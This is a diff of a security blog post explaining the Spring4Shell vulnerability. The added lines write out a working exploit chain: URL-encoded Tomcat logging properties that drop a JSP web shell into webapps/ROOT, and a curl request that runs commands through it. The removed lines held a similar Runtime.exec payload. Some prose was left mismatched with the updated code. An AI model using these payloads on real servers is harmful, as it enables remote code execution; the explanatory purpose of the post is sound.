@@ -193,34 +193,34 @@ and by writing an app to help us test for "real" exploitation._
 Consider the below code:
 
 ```ts
-public class Spring4ShellRequest {
-    public String name;
+public class Greeting {
+	private long id;
 
-    public String getName() {
-        return name;
-    }
+	public long getId() {
+		return id;
+	}
 
-    public void setName(String name) {
-        this.name = name;
-    }
+	public void setId(long id) {
+		this.id = id;
+	}
 }
 
-@RestController
-public class MainController {
-    @RequestMapping(value = "/spring4shell")
-    public void index(Spring4ShellRequest request){
-        System.out.println(request);
+@Controller
+public class HelloController {
+    @PostMapping("/greeting")
+    public String greetingSubmit(@ModelAttribute Greeting greeting, Model model) {
+        return "hello";
     }
 }
 ```
 
 Executing the request:
 ```shell
-curl 'http://localhost:8080/spring4shell?name=test'
+curl 'http://localhost:8080/greeting?id=test'
 ```
 
-Will attempt to parse the query parameters `name=test` into the Plain Old Java Object (POJO) `request` which is of type `Spring4ShellRequest`.
-With this normal request, Spring's `RequestMapping` will use the setter for `name` to set the POJO's name field to `"test"`.
+Will attempt to parse the query parameters `name=test` into the Plain Old Java Object (POJO) `request` which is of type `Greeting`.
+With this normal request, Spring's `RequestMapping` will use the setter for `id` to set the POJO's name field to `"test"`.
 
 The vulnerability exists due to other values that can be set.
 
@@ -235,42 +235,27 @@ curl 'http://localhost:8080/spring4shell?class.module.classLoader.resources.cont
 
 Subsequent requests can be issued which set the following Tomcat logging properties:
 ```shell
-class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%74%65%73%74%7d%69
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di
 class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
-class.module.classLoader.resources.context.parent.pipeline.first.directory=%2f%74%6d%70
-class.module.classLoader.resources.context.parent.pipeline.first.prefix=jsp
+class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
+class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
 class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
 ```
 
+Exploiting this vulnerability is similar to the method for exploiting [CVE-2010-1622](http://blog.o0o.nu/2010/06/cve-2010-1622.html).
+
 Issuing a final request will use the values that have been set to exploit the vulnerability
-```yaml
-GET /stupidRumor_war_exploded/any/path?cmd=touch /tmp/test HTTP/1.1
-Host: 127.0.0.1:8080
-User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-test: `<%Runtime.getRuntime().exec(request.getParameter("cmd"))%>`
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Connection: close
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: none
-Sec-Fetch-User: ?1
+```shell
+curl http://localhost:8080/shell.jsp?cmd=whoami
 ```
 
-A file will be written to: `/tmp/test.jsp` and it will contain the contents: `<%Runtime.getRuntime().exec(request.getParameter("cmd"))%>`.
-This file will be used for format the logs for the server and an arbitrary command can be passed in using the query parameter `query`.
+A file will be written to: `webapps/ROOT/shell.jsp` and it will contain the payload from the Tomcat pattern property set above.
+This file will be used for format the logs for the server and an arbitrary command can be passed in using the query parameter `cmd`.
 
-:::info Exploit Verification
-We have not successfully verified, for ourselves, that this exploit works. To the best of our knowledge, and based on the reports from trusted
-sources, that this is the vector of exploitation for this vulnerability for Spring4Shell.
+It is important to note that this has only been tested to work on an [Apache Tomcat server](https://github.com/lunasec-io/Spring4Shell-POC/blob/master/Dockerfile#L1).
+Without being run on a Tomcat server, the above logging properties will not exist and another method of exploitation will be needed.
 
-Some simple POCs are
-[available on GitHub](https://github.com/lunasec-io/spring-rce-vulnerable-app) to start testing with, but the POCs we've
-used are still not trivial to trigger the exploit with. We'll have an updated POC link tomorrow with a full reproduction
-environment.
-:::
+To test this exploit for yourself, you can check out [our fork of reznok's Spring4Shell POC here](https://github.com/lunasec-io/Spring4Shell-POC/blob/master/exploit.py).
 
 ### Test the Exploit yourself
 
